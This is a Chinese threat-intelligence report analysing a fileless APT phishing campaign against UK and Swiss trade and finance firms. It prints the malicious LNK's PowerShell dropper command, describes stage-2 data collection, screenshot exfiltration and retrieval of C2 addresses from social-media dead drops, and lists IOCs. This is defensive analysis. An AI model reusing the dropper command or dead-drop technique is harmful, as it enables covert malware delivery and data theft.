## **一、** **概述**

**近日，腾讯御见威胁情报中心在日常的恶意文件运营中，发现了几个可疑的钓鱼lnk（伪装成快捷方式文件的攻击程序）。经过分析发现，这些lnk构造巧妙，全程无PE文件落地（Fileless攻击），并且把解密key和C2存放在了twitter、youtube等社交站点上。**

从关联到的样本来看，攻击针对英国、瑞士等欧洲国家，攻击目标为外贸、金融相关企业。暂时还不详具体的攻击者背景，望安全社区同仁一起来完善攻击的拼图。

该APT组织攻击手法的一些特点：

1.诱饵文件为压缩包中伪装成PDF文档的LNK文件（LNK默认是快捷方式，恶意程序执行后会打开一个欺骗性的PDF文件，这个组合极有欺骗性）；

2.攻击过程中，全程无PE文件落地，巧妙避开安全软件的常规检测；

3.攻击程序会判断电脑是否安装网络嗅探工具（wireshark和Nmap，通常为安全研究人员用于网络抓包分析），如果有，就不执行木马核心功能；

4.通过youtube、twitter、Google、wordpress.com的公共空间更新C2，存放解密代码；

5.收集目标计算机名、杀毒软件信息、系统安全时间、系统版本等情报，定时截屏上传；

6.检测是否存在虚拟机等特殊软件。

## 二、技术分析

### 1.攻击诱饵

本次攻击的诱饵是一个zip压缩包，名字为：Dubai_Lawyers_update_2018.zip，压缩报里包含2个lnk文件：

![1.png](https://image.3001.net/images/20181214/1544755187_5c1317f359197.png!small)

而lnk为攻击者精心构造的恶意lnk，点击运行lnk后，会触发执行包含的恶意代码：

![2.png](https://image.3001.net/images/20181214/1544755198_5c1317fe2ecc3.png!small)其中，压缩包里的两个lnk的内容类似，我们以其中一个为例进行详细分析。

### **2.lnk分析**

运行lnk后，执行的恶意代码如下：

    
    
    Cmd.exe "/c powershell -c "$m='A_Dhabi.pdf.lnk';$t=[environment]::getenvironmentvariable('tmp');cp$m $t\$m;$z=$t+'\'+@(gci -name $t $m -rec)[0];$a=gc $z|out-string;$q=$a[($a.length-2340)..$a.length];[io.file]::WriteAllbytes($t+'\.vbe',$q);CsCrIpT$t'\.vbe'"

该命令的主要功能为：

1）将dubai.pdf.lnk文件复制到”%temp%”目录；

2）将lnk文件结尾处往回2340字节的内容，写入“%temp%\\.vbe“文件中；

3）利用cscript.exe将vbe给执行起来。

写入的.vbe文件为使用Encoded加密的脚本文件：

![3.png](https://image.3001.net/images/20181214/1544755228_5c13181c4cef5.png!small)解密后内容如下：  

![4.png](https://image.3001.net/images/20181214/1544755245_5c13182dd7c8f.png!small)![5.png](https://image.3001.net/images/20181214/1544755257_5c13183925ebd.png!small)

### **3.Vbe脚本分析**  

先将lnk文件从文件头开始，偏移为2334，大小为136848字节的内容写入“A_Dhabi.pdf”，该文件保存在temp目录，而该文件确实为一个pdf文件。接着打开该pdf文件，让受害者误以为只是简单得打开了一个正常的pdf文件而已：

![6.png](https://image.3001.net/images/20181214/1544755276_5c13184cdf18f.png!small)打开的pdf文件如下：  

![7.png](https://image.3001.net/images/20181214/1544755290_5c13185acd60e.png!small)接着将lnk文件中pdf文件之后的338459字节的内容，写入“%temp%\~.tmpF292.ps1”文件中，该文件为powershell脚本：  

![8.png](https://image.3001.net/images/20181214/1544755302_5c131866a8e78.png!small)最后将接下来的读取位置写入”%temp%\~.tmpF293”文件中，并利用powershell将“~.tmpF292.ps1”文件给执行起来：  

###
![9.png](https://image.3001.net/images/20181214/1544755315_5c1318732249e.png!small)**4.~.tmpF292.ps1分析**  

原始的ps1脚本是经过加密后的脚本：

![10.png](https://image.3001.net/images/20181214/1544755343_5c13188f5bb2e.png!small)经过解密后，发现两个特殊的明文字符串：  

    
    
    “Lorem Ipsum is simply dummy text of the printing and typesettingindustry. Lorem Ipsum has been the industrys standard dummy text ever since the1500s” 和“when an unknown printer took a galley of typeand scrambled it to make a type specimen book. It has    survived not only fivecenturies but also the leap into electronic typesetting remaining essentiallyunchanged.”

这两个字符串没有参与加密代码的计算，基本上没有任何意义。

而使用搜索引擎搜索该字符后发现，该字符串是为了排版测试的：

![11.png](https://image.3001.net/images/20181214/1544755357_5c13189debef4.png!small)![12.png](https://image.3001.net/images/20181214/1544755365_5c1318a5b160d.png!small)

加密的代码经过解密，代码逻辑就十分清晰了：  

![13.png](https://image.3001.net/images/20181214/1544755379_5c1318b3bb4da.png!small)其中，
$code = @"到"@部分为powershell里调用的c#方法，后面为powershell脚本命令。  

该powershell脚本的主要功能为：

1）使用WMI，检测安全软件，包括AVG、AVAST，若存在，则删除中间文件，然后退出；

![14.png](https://image.3001.net/images/20181214/1544755391_5c1318bfdf446.png!small)2）判断是否有wireshark和Nmap，若存在，则不执行木马核心功能；  

![15.png](https://image.3001.net/images/20181214/1544755404_5c1318cc51f45.png!small)3）从~.tmpF293”文件中获取文件偏移，然后从lnk文件中读取信息，然后存入“%temp%\
~.tmpF291”目录中，涉及到的文件名有~.tmpF222.tmp、~.tmpF295.ico、~.tmpF299.vbe；  

![16.png](https://image.3001.net/images/20181214/1544755417_5c1318d941053.png!small)4）继续会从lnk中读取第二阶段的payload，并利用网上获取到的key对payload进行解密并执行。若网络不通未拿到key，就将第二阶段的payload以加密状态存储在“%temp%\
~.tmp.e”文件中；

![17.png](https://image.3001.net/images/20181214/1544755429_5c1318e581f47.png!small)5）如果“%temp%\
~.tmp.e”文件存在，会利用从网络上获取的key去解密此文件，得到第二阶段的payload文件“~.tmpF294.ps1”，并执行此文件。

![18.png](https://image.3001.net/images/20181214/1544755454_5c1318fe062c5.png!small)

6）获取解密key的url，存储在tmpF222.tmp文件中：

![19.png](https://image.3001.net/images/20181214/1544755783_5c131a474bf3c.png!small)获取到url如下：

> <https://youtu.be/40rHiF75z5o>
>
>
> [https://brady4th.wordpress.com/2018/11/15/opener/](https://brady4th.wordpress.com/2018/11/15/opener/https://twitter.com/Fancy65716779)
>
>
> [https://twitter.com/Fancy65716779](https://brady4th.wordpress.com/2018/11/15/opener/https://twitter.com/Fancy65716779)
>
> <https://plus.google.com/u/0/collection/U84ZPF>

然后，从这些url中获取相应的解密代码，其中：

“Yobro i sing”字符串开始的位置为stage2 payload的c2；

“My keyboard doesnt work”开始的字符串为解密key：

![20.png](https://image.3001.net/images/20181214/1544755814_5c131a6632159.png!small)

![21.png](https://image.3001.net/images/20181214/1544755841_5c131a815d871.png!small)

![22.png](https://image.3001.net/images/20181214/1544755860_5c131a945ad6a.png!small)![23.png](https://image.3001.net/images/20181214/1544755878_5c131aa6790e5.png!small)

![24.png](https://image.3001.net/images/20181214/1544755890_5c131ab29b2ff.png!small)从文章的发表时间，我们猜测，真正的攻击开始时间发生在11月15日和11月18日。

7）持久性攻击：在startup目录创建快捷方式，快捷方式会cscript.exe将“~.tmpF291“目录 中的”
~.tmpF299.vbe“文件给执行起来，快捷方式图标为” ~.tmpF295.ico“

![25.png](https://image.3001.net/images/20181214/1544755905_5c131ac1247b9.png!small)“~.tmpF299.vbe”解密后内容如下：  

![26.png](https://image.3001.net/images/20181214/1544755918_5c131ace3b17b.png!small)

### **5.Stage2（~.tmpF294.ps1）分析**

~.tmpF294.ps1为stage2的脚本文件，同样经过了加密，解密后可以发现与真正的c2通信等功能都在此ps脚本中。

1）使用WMI命令收集相关计算机信息，然后以json格式发送给C2：

![27.png](https://image.3001.net/images/20181214/1544755941_5c131ae549942.png!small)![28.png](https://image.3001.net/images/20181214/1544755965_5c131afda3ea5.png!small)收集的内容包括计算机名、机器名、杀软信息、系统安装时间、系统版本等。格式中还包含“ace”、“dama”、“king”、“joker”等字样。

2）检测虚拟机等特殊软件：

![29.png](https://image.3001.net/images/20181214/1544755981_5c131b0dcd671.png!small)

![30.png](https://image.3001.net/images/20181214/1544755997_5c131b1d7ac64.png!small)3）检测wireshark、winpcap、Nmap等特定软件是否安装：

![31.png](https://image.3001.net/images/20181214/1544756022_5c131b364a6d7.png!small)

![32.png](https://image.3001.net/images/20181214/1544756041_5c131b498cab9.png!small)4）从twitter、youtube、google、wordpress等网站更新C2：

![33.png](https://image.3001.net/images/20181214/1544756053_5c131b559be2b.png!small)5）定时截屏并发送：

![34.png](https://image.3001.net/images/20181214/1544756063_5c131b5f7b3a0.png!small)

![35.png](https://image.3001.net/images/20181214/1544756077_5c131b6d03d88.png!small)6）执行C2下发的powershell脚本：

![36.png](https://image.3001.net/images/20181214/1544756091_5c131b7b7a15b.png!small)7）隐藏“%temp%\~.tmpF291”目录，特殊的存储路径“AA36ED3F6A22”为ip存储路径、“E4DAFF315DFA”域名存储路径、“~.tmpF297.tmp”为c2下发的序列号存储路径。

![37.png](https://image.3001.net/images/20181214/1544756101_5c131b85bd6ae.png!small)

![38.png](https://image.3001.net/images/20181214/1544756113_5c131b91935cd.png!small)8）根据服务器指定修改定时截屏时的画面质量及频率：

![39.png](https://image.3001.net/images/20181214/1544756125_5c131b9d943e0.png!small)

![40.png](https://image.3001.net/images/20181214/1544756138_5c131baa98562.png!small)

## **三、** **关联分析**

### 1.样本拓线：

经过C2的反查，我们又查到找其余几个相同的样本：

![41.png](https://image.3001.net/images/20181214/1544756150_5c131bb6812f6.png!small)

    
    
    Confirm.pdf.lnk，d83f933b2a6c307e17438749eda29f02
    
    
    Gift-18.pdf.lnk，6f965640bc609f9c5b7fea181a2a83ca

而这两个lnk同样来自于一个zip压缩包：Gift-18.zip

![42.png](https://image.3001.net/images/20181214/1544756166_5c131bc6be79d.png!small)经分析，这两个lnk跟分析的lnk为同一个攻击。而压缩包中还包含了一张图片：

![43.png](https://image.3001.net/images/20181214/1544756179_5c131bd3169d7.png!small)释放的pdf如下：

![44.png](https://image.3001.net/images/20181214/1544756192_5c131be09a2d8.png!small)继续关联，我们又发现了另外2个lnk：

    
    
    ecamos_Volatility_Strategy_2X.pdf.lnk：540bc05130424301a8f0543e0240df1d
    
    
    p2_ecamos_Volatility_Strategy_2X.pdf.lnk：38b777dfd5f153609ad6ff8cff1bdedc

运行后，pdf内容如下：

![45.png](https://image.3001.net/images/20181214/1544756223_5c131bff30758.png!small)

![46.png](https://image.3001.net/images/20181214/1544756224_5c131c004b821.png!small)我们猜测，该次攻击对象为瑞士的金融机构和贸易公司。该lnk获取解密key的url为：

> <https://twitter.com/sabinepfeffer69/status/928607342177988608>
>
> <https://mads281.wordpress.com>
>
> <https://www.youtube.com/watch?v=ZRQ-1I856XA>

跟上述分析的一致。

###  **2.攻击中的相关元素**

1）攻击的某个诱饵pdf来自于英国政府网站：<https://assets.publishing.service.gov.uk/government/uploads/system/uploads/attachment_data/file/754075/Dubai_List_of_Lawyers_-_Nov_2018.pdf>

![47.png](https://image.3001.net/images/20181214/1544756256_5c131c20d52b6.png!small)2）某个诱饵pdf里的图片里的公司的信息：

![48.png](https://image.3001.net/images/20181214/1544756267_5c131c2badf0a.png!small)该图片来自：<http://i68.tinypic.com/jtntyd.jpg>

3）存放解密信息的博客[https://brady4th.wordpress.com](https://brady4th.wordpress.com/)中的第一条信息，引用了一句名人的话：

![49.png](https://image.3001.net/images/20181214/1544756292_5c131c44347c2.png!small)IzaakWalton为一个英国的作家：

![50.png](https://image.3001.net/images/20181214/1544756293_5c131c45bb9a2.png!small)4）youtube中的电影：

![51.png](https://image.3001.net/images/20181214/1544756317_5c131c5d14a52.png!small)该电影为一个法国电影，被称为世界上第一部恐怖电影。

![52.png](https://image.3001.net/images/20181214/1544756327_5c131c67ef179.png!small)5）此外还有不少字符串信息，如dubuk7、dama、AshleyBrady、brady4th、Fancy65716779、Pansy
Radon、sabinepfeffer69、mads281、The Obsidian Cloud Casino v1.0等。不过并未搜索和关联到更多的信息。

###  **3.攻击背景**

从攻击对象来看，主要是英国、瑞士的相关外贸机构和金融机构。而攻击者角度来看，作者并未留下太多可追溯的确切证据。而从使用lnk钓鱼、fileless攻击的组织来看，似乎APT29更接近，不过暂未发现任何证据指向该组织。因此我们也希望更多安全社区同仁一起合作，来完善该次攻击的拼图。

##  **四、** **安全建议**

1.不要打开不明来源的邮件附件；

2.及时打系统补丁和重要软件的补丁；

3.使用杀毒软件防御可能的病毒木马攻击；

4.使用腾讯御界高级威胁检测系统。御界高级威胁检测系统，是基于腾讯反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。

##
![53.jpg](https://image.3001.net/images/20181214/1544756343_5c131c779ca27.jpg!small)
**五、** **附录（IOCs）**

###  **MD5：** ****

e1718289718792651fa401c945c17079

3b359a0e279c4e8c5b781e0518320b46

6f965640bc609f9c5b7fea181a2a83ca

d83f933b2a6c307e17438749eda29f02

540bc05130424301a8f0543e0240df1d

38b777dfd5f153609ad6ff8cff1bdedc

###  **IP：**

54.38.192.174

###  **url** **：**

<https://youtu.be/40rHiF75z5o>

<https://brady4th.wordpress.com/2018/11/15/opener/>

<https://twitter.com/Fancy65716779>

<https://plus.google.com/u/0/collection/U84ZPF>

<https://twitter.com/sabinepfeffer69/status/928607342177988608>

<https://mads281.wordpress.com>

<https://www.youtube.com/watch?v=ZRQ-1I856XA>

***本文作者：腾讯电脑管家，转载请注明来自FreeBuf.COM**

